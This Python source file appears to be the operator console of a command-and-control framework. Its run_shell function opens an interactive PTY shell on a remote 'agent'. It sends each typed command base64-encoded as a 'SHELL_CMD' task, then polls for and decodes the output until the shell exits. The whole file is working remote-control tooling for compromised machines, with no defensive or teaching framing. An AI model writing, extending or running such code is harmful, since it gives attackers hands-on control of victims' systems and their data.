import base64
import sys
import time
import re
from colorama import Fore, Style


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def run_shell(manager, agent_id, c2_server):
    _write(f"{Fore.CYAN}[*] PTY shell for agent {agent_id}{Style.RESET_ALL}\n")
    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")

    tid = manager.send_task(agent_id, "SHELL:", {})
    if not tid:
        _write("[!] Agent not found\n")
        return

    ready = False
    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            out = r.get("output", "")
            if out.startswith("SHELL:ready:"):
                data = strip_ansi(base64.b64decode(out[11:]).decode())
                _write(data)
                ready = True
                break
        if ready:
            break

    if not ready:
        _write("[!] Shell failed\n")
        return

    while True:
        try:
            cmd = input()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break

        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        b64 = base64.b64encode(cmd.encode()).decode()
        tid = manager.send_task(agent_id, f"SHELL_CMD:{b64}", {})

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    try:
                        data = strip_ansi(base64.b64decode(out).decode())
                    except Exception:
                        data = out
                    _write(data)
                elif out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        _write(data)
                    except Exception:
                        pass
                elif out.startswith("SHELL:exited"):
                    _write("\n[+] Shell exited\n")
                    return
